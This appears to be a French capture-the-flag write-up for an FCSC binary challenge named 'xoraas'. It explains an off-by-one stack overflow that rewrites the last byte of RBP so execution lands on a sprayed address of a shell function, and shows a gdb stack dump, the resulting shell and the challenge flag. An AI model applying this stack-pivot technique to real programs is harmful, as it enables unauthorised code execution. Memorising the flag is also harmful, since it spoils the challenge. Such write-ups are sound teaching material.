P'tit coup de Ghidra

On a 3 fonctions intéressantes (copiées dans [source.c](source.c))

On vise shell, évidemment.

Le main crée un char buffer[128], lit bien 128 caractères dedans (pas d'overflow ici) et appelle xor sur le buffer avant d'afficher ce qu'il contient.

xor, elle, est intéressante. Elle crée un buffer de 140 octets mais en lit 145.

Comme il n'y a pas de canary, on se retrouve dans le schéma habituel où on va écraser RBP (8 octets car 64 bits) puis RIP (8 octets aussi)

À cause de l'alignement de la stack cependant, le buffer a une taille de 144 octets (18 * 8). On ne peut donc écraser que le bit le moins significatif de RBP (en little endian), et pas du tout RIP. Heureusement, on se rend compte avec gdb notre chaîne de caractères se trouve juste au dessus de RBP : si on réécrit son dernier octet, il y a de grandes chances qu'on tombe dedans.

On écrit un petit script avec pwntools pour envoyer 128 fois 0x00 (pour neutraliser le xor) puis autant de fois que possible notre adresse cible (celle de shell, à 0x401142) en espérant que le RBP réécrit tombe sur l'une d'elles. Enfin, on écrit un dernier octet à 0x00 ou 0x80 pour remonter dans la stack. J'ai eu des résultats mitigés avec les autres valeurs, ces deux là semblent marcher ~80% du temps.

En effet, parfois la stack est faite de telle façon que RBP se trouve juste avant ou après un changement d'octet en avant-dernier bit significatif, et dans une telle configuration en réécrire le dernier octet renvoie vers une adresse invalide.

Après exploit (en utilisant 0x80 en dernier octet), la stack ressemble à ceci :

```
gdb-peda$ x/44xg $rsp
0x7fffffffdcb0: 0x00007fffffffdd60      0x00007fffffffdd60
0x7fffffffdcc0: 0x0000000000401142      0x0000000000401142 # second buffer[144] + 1
0x7fffffffdcd0: 0x0000000000401142      0x0000000000401142
0x7fffffffdce0: 0x0000000000401142      0x0000000000401142
0x7fffffffdcf0: 0x0000000000401142      0x0000000000401142
0x7fffffffdd00: 0x0000000000401142      0x0000000000401142
0x7fffffffdd10: 0x0000000000401142      0x0000000000401142
0x7fffffffdd20: 0x0000000000401142      0x0000000000401142
0x7fffffffdd30: 0x0000000000401142      0x0000000000401142
0x7fffffffdd40: 0x0000000000401142      0x0000008000401142
0x7fffffffdd50: 0x00007fffffffdd80      0x0000000000401213 # RBP réécrit avec 0x80 ici
0x7fffffffdd60: 0x0000000000401142      0x0000000000401142 # premier buffer[128]
0x7fffffffdd70: 0x0000000000401142      0x0000000000401142
0x7fffffffdd80: 0x0000000000401142      0x0000000000401142
0x7fffffffdd90: 0x0000000000401142      0x0000000000401142
0x7fffffffdda0: 0x0000000000401142      0x0000000000401142
0x7fffffffddb0: 0x0000000000401142      0x0000000000401142
0x7fffffffddc0: 0x0000000000401142      0x0000000000401142
0x7fffffffddd0: 0x0000000000401142      0x0000000000401142
0x7fffffffdde0: 0x0000000000401240      0x00007ffff7e09d0a
0x7fffffffddf0: 0x00007fffffffded8      0x0000000100000000
0x7fffffffde00: 0x00000000004011df      0x00007ffff7e097cf
gdb-peda$ x $rbp
0x7fffffffdd50: 0x00007fffffffdd80
```

Et on obtient notre shell

```
$ ./solve.py
[+] Starting local process './xoraas': pid 77794
[*] Switching to interactive mode
$ whoami
syca
```

On le lance en remote et on récupère le flag

FCSC{0d6c81576d1465a876422910769e79af287c9e73254112572737383039194f5d}
